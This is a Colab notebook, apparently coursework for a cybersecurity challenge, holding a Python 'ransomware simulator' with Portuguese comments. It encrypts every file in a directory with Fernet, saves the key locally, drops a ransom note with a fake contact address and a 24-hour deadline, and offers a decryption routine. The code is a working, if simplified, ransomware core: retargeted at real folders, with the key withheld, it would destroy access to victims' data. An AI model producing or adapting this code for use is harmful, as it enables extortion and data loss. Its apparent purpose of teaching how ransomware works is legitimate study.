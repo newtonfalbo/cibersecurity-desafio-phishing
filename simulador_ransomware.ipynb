{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOzEFAMZ/U13IRcXfKaXauL",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/newtonfalbo/cibersecurity-desafio-phishing/blob/main/simulador_ransomware.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "3_qhGcf_gL_R",
        "outputId": "f1a2a7ab-0ab5-43e3-8f55-bd2abe1543f0"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Deseja criptografar (E) ou descriptografar (D) os arquivos? Sim\n",
            "Opção inválida!\n"
          ]
        }
      ],
      "source": [
        "from cryptography.fernet import Fernet\n",
        "import os\n",
        "import time\n",
        "\n",
        "# Gerar chave de criptografia e salvar em um arquivo\n",
        "def generate_key():\n",
        "    key = Fernet.generate_key()\n",
        "    with open(\"key.key\", \"wb\") as key_file:\n",
        "        key_file.write(key)\n",
        "    return key\n",
        "\n",
        "# Carregar chave existente\n",
        "def load_key():\n",
        "    return open(\"key.key\", \"rb\").read()\n",
        "\n",
        "# Criptografar arquivos em um diretório\n",
        "def encrypt_files(directory, key):\n",
        "    fernet = Fernet(key)\n",
        "    for file in os.listdir(directory):\n",
        "        file_path = os.path.join(directory, file)\n",
        "        if os.path.isfile(file_path):\n",
        "            with open(file_path, \"rb\") as f:\n",
        "                data = f.read()\n",
        "            encrypted_data = fernet.encrypt(data)\n",
        "            with open(file_path, \"wb\") as f:\n",
        "                f.write(encrypted_data)\n",
        "            print(f\"Arquivo criptografado: {file}\")\n",
        "\n",
        "    # Criar mensagem de resgate\n",
        "    with open(os.path.join(directory, \"README_RESCUE.txt\"), \"w\") as f:\n",
        "        f.write(\"Seus arquivos foram criptografados! Para recuperar, use a chave correta.\\n\")\n",
        "        f.write(\"Envie um e-mail para recovery@fakeemail.com para obter instruções.\\n\")\n",
        "        f.write(\"Tempo restante para recuperação: 24 horas.\\n\")\n",
        "        f.write(\"(Simulação, sem riscos reais!)\")\n",
        "\n",
        "# Descriptografar arquivos\n",
        "def decrypt_files(directory, key):\n",
        "    fernet = Fernet(key)\n",
        "    for file in os.listdir(directory):\n",
        "        file_path = os.path.join(directory, file)\n",
        "        if os.path.isfile(file_path) and file != \"README_RESCUE.txt\":\n",
        "            with open(file_path, \"rb\") as f:\n",
        "                encrypted_data = f.read()\n",
        "            decrypted_data = fernet.decrypt(encrypted_data)\n",
        "            with open(file_path, \"wb\") as f:\n",
        "                f.write(decrypted_data)\n",
        "            print(f\"Arquivo recuperado: {file}\")\n",
        "\n",
        "    # Remover mensagem de resgate\n",
        "    rescue_file = os.path.join(directory, \"README_RESCUE.txt\")\n",
        "    if os.path.exists(rescue_file):\n",
        "        os.remove(rescue_file)\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    folder = \"test_files\"  # Diretório onde os arquivos serão criptografados\n",
        "    os.makedirs(folder, exist_ok=True)\n",
        "\n",
        "    choice = input(\"Deseja criptografar (E) ou descriptografar (D) os arquivos? \").strip().upper()\n",
        "\n",
        "    if choice == \"E\":\n",
        "        key = generate_key()\n",
        "        encrypt_files(folder, key)\n",
        "        print(\"Seus arquivos foram criptografados! Use a chave no arquivo key.key para recuperar.\")\n",
        "    elif choice == \"D\":\n",
        "        if os.path.exists(\"key.key\"):\n",
        "            key = load_key()\n",
        "            decrypt_files(folder, key)\n",
        "            print(\"Seus arquivos foram recuperados!\")\n",
        "        else:\n",
        "            print(\"Chave de descriptografia não encontrada!\")\n",
        "    else:\n",
        "        print(\"Opção inválida!\")\n"
      ]
    }
  ]
}